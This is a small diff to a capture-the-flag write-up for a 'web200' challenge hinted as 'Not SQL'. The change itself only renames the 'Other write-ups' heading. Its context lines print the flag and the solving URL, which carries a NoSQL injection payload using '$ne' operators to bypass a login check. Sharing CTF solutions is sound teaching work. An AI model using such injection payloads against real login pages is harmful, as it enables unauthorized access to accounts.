@@ -10,6 +10,6 @@ The hint [“Not SQL”](https://twitter.com/OpenSecurity_IN/status/440536455614
 
 The final solution that resulted in the flag `flag{itoldunaathisisnotSQLinjection}` was `http://54.201.96.212:888/web200/?userid[$ne]=a&password[$ne]=a`.
 
-## Other write-ups
+## Other write-ups and resources
 
 * none yet
